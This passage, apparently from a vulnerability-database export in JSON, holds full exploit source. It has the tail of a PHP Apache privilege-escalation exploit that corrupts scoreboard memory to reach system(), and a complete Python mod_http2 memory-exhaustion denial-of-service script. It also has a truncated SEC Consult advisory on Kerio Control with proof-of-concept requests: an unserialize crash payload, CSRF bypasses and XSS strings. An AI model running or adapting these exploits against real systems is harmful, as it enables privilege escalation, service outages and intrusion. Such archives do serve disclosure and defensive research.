8];\r\n\t\t}\r\n\t\to('');\r\n\r\n\t\t# Find workers PID in the SHM: it indicates the beginning of their\r\n\t\t# process_score structure. We can then change process_score.bucket to\r\n\t\t# the index we computed. When apache reboots, it will use\r\n\t\t# all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex\r\n\t\t# which means we control the whole apr_proc_mutex_t structure.\r\n\t\t# This structure contains pointers to multiple functions, especially\r\n\t\t# mutex->meth->child_init(), which will be called before privileges\r\n\t\t# are dropped.\r\n\t\t# We do this for every worker PID, incrementing the bucket index so that\r\n\t\t# we cover a bigger range.\r\n\t\t\r\n\t\to('Iterating in SHM to find PIDs...');\r\n\r\n\t\t# Number of bucket indexes covered by our spray\r\n\t\t$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);\r\n\t\t# Number of bucket indexes covered by our spray and the PS structures\r\n\t\t$total_nb_buckets = $spray_nb_buckets * count($workers_pids);\r\n\t\t# First bucket index to handle\r\n\t\t$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);\r\n\r\n\t\t# Iterate over every process_score structure until we find every PID or\r\n\t\t# we reach the end of the SHM\r\n\t\tfor(\r\n\t\t\t$p = $addresses['shm'][0] + 0x20;\r\n\t\t\t$p < $addresses['shm'][1] && count($workers_pids) > 0;\r\n\t\t\t$p += 0x24\r\n\t\t)\r\n\t\t{\r\n\t\t\t$l = $p - $address;\r\n\t\t\t$current_pid = str2ptr($this->abc, $l, 4);\r\n\t\t\to('Got PID: ' . $current_pid);\r\n\t\t\t# The PID matches one of the workers\r\n\t\t\tif(in_array($current_pid, $workers_pids))\r\n\t\t\t{\r\n\t\t\t\tunset($workers_pids[$current_pid]);\r\n\t\t\t\to('  PID matches');\r\n\t\t\t\t# Update bucket address\r\n\t\t\t\t$s_bucket_index = pack('l', $bucket_index);\r\n\t\t\t\t$this->abc[$l + 0x20] = $s_bucket_index[0];\r\n\t\t\t\t$this->abc[$l + 0x21] = $s_bucket_index[1];\r\n\t\t\t\t$this->abc[$l + 0x22] = $s_bucket_index[2];\r\n\t\t\t\t$this->abc[$l + 0x23] = $s_bucket_index[3];\r\n\t\t\t\to('  Changed bucket value to ' . $bucket_index);\r\n\t\t\t\t$min = $spray_min - $size_prefork_child_bucket * $bucket_index;\r\n\t\t\t\t$max = $spray_max - $size_prefork_child_bucket * $bucket_index;\r\n\t\t\t\to('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));\r\n\t\t\t\t# This bucket range is covered, go to the next one\r\n\t\t\t\t$bucket_index += $spray_nb_buckets;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif(count($workers_pids) > 0)\r\n\t\t{\r\n\t\t\to(\r\n\t\t\t\t'Unable to find PIDs ' .\r\n\t\t\t\timplode(', ', $workers_pids) .\r\n\t\t\t\t' in SHM, exiting.'\r\n\t\t\t);\r\n\t\t\texit();\r\n\t\t}\r\n\r\n\t\to('');\r\n\t\to('EXPLOIT SUCCESSFUL.');\r\n\t\to('Await 6:25AM.');\r\n\t\t\r\n\t\treturn 0;\r\n\t}\r\n}\r\n\r\nfunction o($msg)\r\n{\r\n\t# No concatenation -> no string allocation\r\n\tprint($msg);\r\n\tprint(\"\\n\");\r\n}\r\n\r\nfunction ptr2str($ptr, $m=8)\r\n{\r\n\t$out = \"\";\r\n    for ($i=0; $i<$m; $i++)\r\n    {\r\n        $out .= chr($ptr & 0xff);\r\n        $ptr >>= 8;\r\n    }\r\n    return $out;\r\n}\r\n\r\nfunction str2ptr(&$str, $p, $s=8)\r\n{\r\n\t$address = 0;\r\n\tfor($j=$s-1;$j>=0;$j--)\r\n\t{\r\n\t\t$address <<= 8;\r\n\t\t$address |= ord($str[$p+$j]);\r\n\t}\r\n\treturn $address;\r\n}\r\n\r\nfunction in($i, $range)\r\n{\r\n\treturn $i >= $range[0] && $i < $range[1];\r\n}\r\n\r\n/**\r\n * Finds the offset of a symbol in a file.\r\n */\r\nfunction find_symbol($file, $symbol)\r\n{\r\n    $elf = file_get_contents($file);\r\n    $e_shoff = str2ptr($elf, 0x28);\r\n    $e_shentsize = str2ptr($elf, 0x3a, 2);\r\n    $e_shnum = str2ptr($elf, 0x3c, 2);\r\n\r\n    $dynsym_off = 0;\r\n    $dynsym_sz = 0;\r\n    $dynstr_off = 0;\r\n\r\n    for($i=0;$i<$e_shnum;$i++)\r\n    {\r\n        $offset = $e_shoff + $i * $e_shentsize;\r\n        $sh_type = str2ptr($elf, $offset + 0x04, 4);\r\n\r\n        $SHT_DYNSYM = 11;\r\n        $SHT_SYMTAB = 2;\r\n        $SHT_STRTAB = 3;\r\n\r\n        switch($sh_type)\r\n        {\r\n            case $SHT_DYNSYM:\r\n                $dynsym_off = str2ptr($elf, $offset + 0x18, 8);\r\n                $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);\r\n                break;\r\n            case $SHT_STRTAB:\r\n            case $SHT_SYMTAB:\r\n                if(!$dynstr_off)\r\n                    $dynstr_off = str2ptr($elf, $offset + 0x18, 8);\r\n                break;\r\n        }\r\n\r\n    }\r\n\r\n    if(!($dynsym_off && $dynsym_sz && $dynstr_off))\r\n        exit('.');\r\n\r\n    $sizeof_Elf64_Sym = 0x18;\r\n\r\n    for($i=0;$i * $sizeof_Elf64_Sym < $dynsym_sz;$i++)\r\n    {\r\n        $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;\r\n        $st_name = str2ptr($elf, $offset, 4);\r\n        \r\n        if(!$st_name)\r\n            continue;\r\n        \r\n        $offset_string = $dynstr_off + $st_name;\r\n        $end = strpos($elf, \"\\x00\", $offset_string) - $offset_string;\r\n        $string = substr($elf, $offset_string, $end);\r\n\r\n        if($string == $symbol)\r\n        {\r\n            $st_value = str2ptr($elf, $offset + 0x8, 8);\r\n            return $st_value;\r\n        }\r\n    }\r\n\r\n    die('Unable to find symbol ' . $symbol);\r\n}\r\n\r\n# Obtains the addresses of the shared memory block and some functions through \r\n# /proc/self/maps\r\n# This is hacky as hell.\r\nfunction get_all_addresses()\r\n{\r\n\t$addresses = [];\r\n\t$data = file_get_contents('/proc/self/maps');\r\n\t$follows_shm = false;\r\n\r\n\tforeach(explode(\"\\n\", $data) as $line)\r\n\t{\r\n\t\tif(!isset($addresses['shm']) && strpos($line, '/dev/zero'))\r\n\t\t{\r\n            $line = explode(' ', $line)[0];\r\n            $bounds = array_map('hexdec', explode('-', $line));\r\n            if ($bounds[1] - $bounds[0] == 0x14000)\r\n            {\r\n                $addresses['shm'] = $bounds;\r\n                $follows_shm = true;\r\n            }\r\n        }\r\n\t\tif(\r\n\t\t\tpreg_match('#(/[^\\s]+libc-[0-9.]+.so[^\\s]*)#', $line, $matches) &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$offset = find_symbol($matches[1], 'system');\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$line = hexdec(explode('-', $line)[0]);\r\n\t\t\t$addresses['system'] = $line + $offset;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tstrpos($line, 'libapr-1.so') &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\t$addresses['libaprX'] = $bounds;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tstrpos($line, 'libapr-1.so') &&\r\n\t\t\tstrpos($line, 'r--p')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\t$addresses['libaprR'] = $bounds;\r\n\t\t}\r\n\t\t# Apache's memory block is between the SHM and ld.so\r\n\t\t# Sometimes some rwx region gets mapped; all_buckets cannot be in there\r\n\t\t# but we include it anyways for the sake of simplicity\r\n\t\tif(\r\n\t\t\t(\r\n\t\t\t\tstrpos($line, 'rw-p') ||\r\n\t\t\t\tstrpos($line, 'rwxp')\r\n\t\t\t) &&\r\n            $follows_shm\r\n\t\t)\r\n\t\t{\r\n            if(strpos($line, '/lib'))\r\n            {\r\n                $follows_shm = false;\r\n                continue;\r\n            }\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\tif(!array_key_exists('apache', $addresses))\r\n\t\t\t    $addresses['apache'] = $bounds;\r\n\t\t\telse if($addresses['apache'][1] == $bounds[0])\r\n                $addresses['apache'][1] = $bounds[1];\r\n\t\t\telse\r\n                $follows_shm = false;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tpreg_match('#(/[^\\s]+libphp7[0-9.]+.so[^\\s]*)#', $line, $matches) &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$offset = find_symbol($matches[1], 'zend_object_std_dtor');\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$line = hexdec(explode('-', $line)[0]);\r\n\t\t\t$addresses['zend_object_std_dtor'] = $line + $offset;\r\n\t\t}\r\n\t}\r\n\r\n\t$expected = [\r\n\t\t'shm', 'system', 'libaprR', 'libaprX', 'apache', 'zend_object_std_dtor'\r\n\t];\r\n\t$missing = array_diff($expected, array_keys($addresses));\r\n\r\n\tif($missing)\r\n\t{\r\n\t\to(\r\n\t\t\t'The following addresses were not determined by parsing ' .\r\n\t\t\t'/proc/self/maps: ' . implode(', ', $missing)\r\n\t\t);\r\n\t\texit(0);\r\n\t}\r\n\r\n\r\n\to('PID: ' . getmypid());\r\n\to('Fetching addresses');\r\n\r\n\tforeach($addresses as $k => $a)\r\n\t{\r\n\t\tif(!is_array($a))\r\n\t\t\t$a = [$a];\r\n\t\to('  ' . $k . ': ' . implode('-0x', array_map(function($z) {\r\n\t\t\t\treturn '0x' . dechex($z);\r\n\t\t}, $a)));\r\n\t}\r\n\to('');\r\n\r\n\treturn $addresses;\r\n}\r\n\r\n# Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,\r\n# matching the cmdline and the UID\r\nfunction get_workers_pids()\r\n{\r\n\to('Obtaining apache workers PIDs');\r\n\t$pids = [];\r\n\t$cmd = file_get_contents('/proc/self/cmdline');\r\n\t$processes = glob('/proc/*');\r\n\tforeach($processes as $process)\r\n\t{\r\n\t\tif(!preg_match('#^/proc/([0-9]+)$#', $process, $match))\r\n\t\t\tcontinue;\r\n\t\t$pid = (int) $match[1];\r\n\t\tif(\r\n\t\t\t!is_readable($process . '/cmdline') ||\r\n\t\t\t!is_readable($process . '/status')\r\n\t\t)\r\n\t\t\tcontinue;\r\n\t\tif($cmd !== file_get_contents($process . '/cmdline'))\r\n\t\t\tcontinue;\r\n\r\n\t\t$status = file_get_contents($process . '/status');\r\n\t\tforeach(explode(\"\\n\", $status) as $line)\r\n\t\t{\r\n\t\t\tif(\r\n\t\t\t\tstrpos($line, 'Uid:') === 0 &&\r\n\t\t\t\tpreg_match('#\\b' . posix_getuid() . '\\b#', $line)\r\n\t\t\t)\r\n\t\t\t{\r\n\t\t\t\to('  Found apache worker: ' . $pid);\r\n\t\t\t\t$pids[$pid] = $pid;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t}\r\n\t\r\n\to('Got ' . sizeof($pids) . ' PIDs.');\r\n\to('');\r\n\r\n\treturn $pids;\r\n}\r\n\r\n$addresses = get_all_addresses();\r\n$workers_pids = get_workers_pids();\r\nreal();\n\n#  0day.today [2019-04-11]  #",
            "cvss": {
                "score": 7.2,
                "vector": "AV:LOCAL/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-32502"
        }
    ],
    "CVE-2016-8740": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2016-12-12T00:00:00",
            "published": "2016-12-12T00:00:00",
            "id": "EDB-ID:40909",
            "href": "https://www.exploit-db.com/exploits/40909",
            "type": "exploitdb",
            "title": "Apache 2.4.23 mod_http2 - Denial of Service",
            "sourceData": "#!/usr/bin/python\r\n\r\n\"\"\" source : http://seclists.org/bugtraq/2016/Dec/3\r\nThe mod_http2 module in the Apache HTTP Server 2.4.17 through 2.4.23, when the Protocols configuration includes h2 or h2c, does not restrict request-header length, which allows remote attackers to cause a denial of service (memory consumption) via crafted CONTINUATION frames in an HTTP/2 request.(https://access.redhat.com/security/cve/cve-2016-8740)\r\n\r\nUsage : cve-2016-8740.py [HOST] [PORT]\r\n\"\"\"\r\n\r\nimport sys\r\nimport struct\r\nimport socket\r\n\r\nHOST = sys.argv[1]\r\nPORT = int(sys.argv[2])\r\n\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect((HOST, PORT))\r\n\r\n# https://http2.github.io/http2-spec/#ConnectionHeader\r\ns.sendall('PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n')\r\n\r\n# https://http2.github.io/http2-spec/#SETTINGS\r\nSETTINGS = struct.pack('3B', 0x00, 0x00, 0x00) # Length\r\nSETTINGS += struct.pack('B', 0x04) # Type\r\nSETTINGS += struct.pack('B', 0x00)\r\nSETTINGS += struct.pack('>I', 0x00000000)\r\ns.sendall(SETTINGS)\r\n\r\n# https://http2.github.io/http2-spec/#HEADERS\r\nHEADER_BLOCK_FRAME = '\\x82\\x84\\x86\\x41\\x86\\xa0\\xe4\\x1d\\x13\\x9d\\x09\\x7a\\x88\\x25\\xb6\\x50\\xc3\\xab\\xb6\\x15\\xc1\\x53\\x03\\x2a\\x2f\\x2a\\x40\\x83\\x18\\xc6\\x3f\\x04\\x76\\x76\\x76\\x76'\r\nHEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] # Length\r\nHEADERS += struct.pack('B', 0x01) # Type\r\nHEADERS += struct.pack('B', 0x00) # Flags\r\nHEADERS += struct.pack('>I', 0x00000001) # Stream ID\r\ns.sendall(HEADERS + HEADER_BLOCK_FRAME)\r\n\r\n# Sending CONTINUATION frames for leaking memory\r\n# https://http2.github.io/http2-spec/#CONTINUATION\r\nwhile True:\r\n    HEADER_BLOCK_FRAME = '\\x40\\x83\\x18\\xc6\\x3f\\x04\\x76\\x76\\x76\\x76'\r\n    HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] # Length\r\n    HEADERS += struct.pack('B', 0x09) # Type\r\n    HEADERS += struct.pack('B', 0x01) # Flags\r\n    HEADERS += struct.pack('>I', 0x00000001) # Stream ID\r\n    s.sendall(HEADERS + HEADER_BLOCK_FRAME)",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:40909"
        }
    ],
    "CVE-2014-0231": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2016-09-22T00:00:00",
            "published": "2016-09-22T00:00:00",
            "href": "https://packetstormsecurity.com/files/138812/Kerio-Control-Unified-Threat-Management-Code-Execution-XSS-Memory-Corruption.html",
            "id": "PACKETSTORM:138812",
            "type": "packetstorm",
            "title": "Kerio Control Unified Threat Management Code Execution / XSS / Memory Corruption",
            "sourceData": "`SEC Consult has also released a blog post describing the attack scenarios  \nof the vulnerabilities within this advisory in detail and a video which  \nshows the remote attack. Exploit code has been developed as well but will  \nnot be released for now.  \n  \nBlog:  \nhttp://blog.sec-consult.com/2016/09/controlling-kerio-control-when-your.html  \n  \nVideo:  \nhttps://www.youtube.com/watch?v=y_OWz25sHMI  \n  \n  \nSEC Consult Vulnerability Lab Security Advisory < 20160922-0 >  \n=======================================================================  \ntitle: Potential backdoor access through multiple vulnerabilities  \nproduct: Kerio Control Unified Threat Management  \nvulnerable version: <9.1.3, verified in version 9.1.0 build 1087 and 9.1.1  \nbuild 1324  \nfixed version: 9.1.3 (partially fixed, see vendor statement below)  \nCVE number: -  \nimpact: critical  \nhomepage: http://www.kerio.com/  \nfound: 2016-08-24  \nby: R. Freingruber (Office Vienna)  \nR. Tavakoli (Office Vienna)  \nSEC Consult Vulnerability Lab  \n  \nAn integrated part of SEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nhttps://www.sec-consult.com  \n  \n=======================================================================  \n  \nVendor description:  \n-------------------  \n\"Protect your network from viruses, malware and malicious activity  \nwith Kerio Control, the easy-to-administer yet powerful all-in-one  \nsecurity solution.  \nKerio Control brings together next-generation firewall capabilities -  \nincluding a network firewall and router, intrusion detection and  \nprevention (IPS), gateway anti-virus, VPN, and web contentand  \napplication filtering. These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same 